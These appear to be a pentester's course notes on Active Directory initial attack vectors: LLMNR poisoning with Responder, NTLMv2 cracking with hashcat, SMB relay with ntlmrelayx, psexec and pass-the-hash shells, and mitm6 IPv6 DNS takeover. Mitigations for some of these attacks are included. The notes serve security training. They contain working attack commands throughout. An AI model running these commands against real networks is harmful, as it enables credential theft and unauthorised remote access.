# Active Directory: Initial Attack Vectors

### Introduction

Scenario:

Performing a pentest for a client. We send a laptop to the client with a VPN allowing remote access to the 
client's network through the tunnel.

### LLMNR Poisoning Overview

What is Link-Local Multicast Name Resoution (LLMNR)?

- Used to identitfy hosts when DNS fails to do so
- Previously NBT-NS
- Key flaw is that the services utilize a user's username and NTLMv2 hash when appropriately responded to
- Enabled by default

A MiTM attack

### Capturing Hashes with Responder

Step 1: Run responder

`sudo responder -I tun0 -dwP`

Step 2: Wait for an event to occur

Step 3: Responder dumps the hashes

Step 4: Crack the hashes with hashcat

`hashcat -m 5600 hashes.txt rockyou.txt`

### Cracking Our Captured Hashes

Find the hash module in hashcat `hashcat --help | grep NTLM` or [on the website](https://hashcat.net/wiki/doku.php?id=example_hashes)

Crack the hashes with hashcat `hashcat -m 5600 hashes.txt /usr/share/wordlist/rockyou.txt -O -r RuleName`

Better wordlists:

- rockyou2021 ~ 90Gb

Rules to use:

- OneRule

Use password lists relative to the area the target is operating in, e.g sports team names in different areas 
etc.

### LLMNR Poisoning Mitigation

The best defense is to disable LLMNR and NBT-NS through a GPO:

**Disable LLMNR**

Open Group Policy Management tool, select or create a GPO and Edit

Computer Configuration -> Policies -> Administrative Templates -> DNS Client -> Turn off multicast name 
resolution

**Disable NBT-NS**

Open network Connections -> Network Adapter Properties -> TCP/IPv4 Properties -> Advanced tab -> WINS tab ->
Disable NetBIOS over TCP/IP

If a company must use or cannot disable LLMNR/NBT-NS, the best course of action is to:

- Require Network Access Control (restrict devices on the network, e.g through MAC address)
- Require strong user passwords (e.g. > 14 chars in length and limit common word use)

### SMB Relay Attacks Overview

**What is SMB Relay?**

Instead of crackiong hashes gathered with Responder, we can instead relay those hashes to specific machines
and potentially gain access

Requirements:

- SMB signing must be disabled or not enforced on the target
- Relayed user credentials must be an admin on the machine for any real value

Identify hosts without SMB signing:

`nmap --script=smb2-security-mode.nse -p445 10.0.0.0/24`

**SMB Relay**

Step 1: Turn SMB and HTTP off in /etc/responder/Responder.conf
Step 2: Run Responder `sudo responder -i tun0 -dwP`
Step 3: Run ntlmrelayx `sudo impacket-ntlmrelayx/ntlmrelay.py -tf targets.txt -smb2support`
Step 4: Wait for an event to occur
Step 5: Responder dumps the hashes from the SAM of the target

Alternatives options to use with ntlmrelayx:

- the `-i` option to start an interactive shell on the target
- the `-c` option to execute a command on the target

### SMB Relay Attacks Lab

Scan our targets with an nmap script to determine whether SMB signing is enabled and enforced

`nmap --script=smb2-security-mode.nse -p445 -Pn 10.10.10.2`

To sweep a network use grep to filter for the vulnerable machines

`nmap --script=smb2-security-mode.nse -p445 -Pn 10.10.10.0/24 | grep not`

Run responder with HTTP and SMB off in /etc/responder/Responder.conf

`sudo responder -I eth0 -dwPv`

Start ntlmrelayx to capture hashes, start an interactive session `-i`, or run a command `-c cmd` using a
targets file

`impacket-ntlmrelayx -tf targets.txt -smb2support`

On one of the targets navigate to the attacking machine's IP to trigger the relay

### SMB Relay Attack Defenses

**Mitigation Strategies:**

Enable SMB signing on all devices
- Pro: Completely stops the attack
- Con: Can cause performance issues with file copies (10-20% decrease in performance, [info here](https://learn.microsoft.com/en-us/troubleshoot/windows-server/networking/reduced-performance-after-smb-encryption-signing))

Disable NTLM authentication on network:
- Pro: Completely stops the attack
- Con: If Kerberos stops working, Windows defaults back to NTLM

*The following are best practice and should be done regardless*

Account Tiering:
- Pro: Limits Domain Admins to specific tasks (e.g. only log on to servers with need for DA)
- Con: Enforcing the policy may be difficult

Local admin restriction (e.g. [LAPS](https://learn.microsoft.com/en-us/windows-server/identity/laps/laps-overview)):
- Pro: Can prevent a lot of lateral movement
- Con: Potential increase in the amount of service desk tickets

### Gaining Shell Access

Using Metasploit, with a password

```
msf6 > use exploit/windows/smb/psexec
msf6 > set SMBDomain domain.local
msf6 > set SMBPass password
msf6 > set SMBUser user
```

Using Metasploit, with a hash

Uses a local user, like adminstrator, so we don't set the domain option (use `unset varname` or set as `.`)

```
msf6 > use exploit/windows/smb/psexec
msf6 > set SMBPass LM:NT
msf6 > set SMBUser user
```

Using psexec, with a password

`impacket-psexec domain.local/user:'password'@10.10.10.2`

Using psexec, with a hash

`impacket-psexec administrator@10.10.10.2 -hashes LM:NT`

*If psexec gets blocked by an AV or for other reasons, try `wmiexec` and `smbexec`*

### IPv6 Attacks Overview

Most networks use IPv4 meaning there are usually no systems resolving DNS for IPv6

We can setup our attacking machine as an IPv6 DNS resolver to relay NTLM credentials into LDAP using mitm6, 
ntlmrelayx and ldaps

### IPv6 DNS Takeover via mitm6

**Need to use impacket v0.9.19 on python2.7 for this to work!**

Start ntlmrelayx using the DCs IP address

`impacket-ntlmrelayx -6 -t ldaps://10.10.10.1 -wh fakewpad.domain.local -l lootme`

Then run mitm6 (Don't leave running and walk away! Can break things in the network so use for 10-15 mins)

`sudo mitm6 -d domain.local -i eth0`

When an event occurs (machine reboot, network log in, access resources with credentials) mitm6 will dump 
domain information into the directory specified with the `-l` option

This includes Domain users, groups, computers, users by group (look at lastLogon and descriptions!) and more

Allows us to find our high value targets and next steps for our attack, also can add user to compromise the 
domain if a DA logs into the network

### IPv6 Attack Defenses


